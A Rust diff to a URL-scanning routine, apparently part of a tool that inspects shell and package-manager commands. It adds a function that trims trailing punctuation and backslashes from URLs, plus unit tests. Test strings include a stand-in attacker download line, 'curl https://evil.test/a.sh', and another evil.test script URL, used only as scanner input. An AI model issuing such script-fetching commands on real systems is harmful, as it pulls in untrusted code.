@@ -1267,6 +1267,15 @@ struct UrlScan<'a> {
     rest: &'a str,
 }
 
+/// Drop trailing bytes that ended the *text*, not the URL. A URL lifted out of
+/// a shell script keeps the line-continuation backslash that followed it, and
+/// one lifted out of prose keeps the sentence punctuation; both then resolve to
+/// a path the server has never heard of. An empty `#` fragment names the same
+/// resource with or without it, so it goes too.
+fn trim_url_tail(url: &str) -> &str {
+    url.trim_end_matches(['\\', '#', '.', ',', ';', ':', '!', '?'])
+}
+
 impl<'a> Iterator for UrlScan<'a> {
     type Item = &'a str;
 
@@ -1288,7 +1297,7 @@ impl<'a> Iterator for UrlScan<'a> {
                         )
                 })
                 .unwrap_or(cand.len());
-            let url = &cand[..end];
+            let url = trim_url_tail(&cand[..end]);
             self.rest = &cand[end..];
             if url.len() > "https://".len() {
                 return Some(url);
@@ -1301,6 +1310,36 @@ impl<'a> Iterator for UrlScan<'a> {
 #[allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_urls_trailing_text_punctuation_is_not_part_of_it() {
+        let text = "curl https://evil.test/a.sh \\\n\
+            see https://evil.test/b.tar.gz.\n\
+            https://evil.test/c#\n";
+        assert_eq!(
+            extract_urls(text).collect::<Vec<_>>(),
+            [
+                "https://evil.test/a.sh",
+                "https://evil.test/b.tar.gz",
+                "https://evil.test/c",
+            ]
+        );
+    }
+
+    /// Only the *trailing* run goes: a yarn `resolved` fragment carries the
+    /// entry's digest, and a query string is part of the address.
+    #[test]
+    fn punctuation_inside_a_url_survives_the_tail_trim() {
+        let text = "resolved https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#5b8a3a77 \
+            https://evil.test/s.sh?v=1.2&t=x";
+        assert_eq!(
+            extract_urls(text).collect::<Vec<_>>(),
+            [
+                "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#5b8a3a77",
+                "https://evil.test/s.sh?v=1.2&t=x",
+            ]
+        );
+    }
 
     #[test]
     fn shell_pkg_manager_commands_and_urls() {
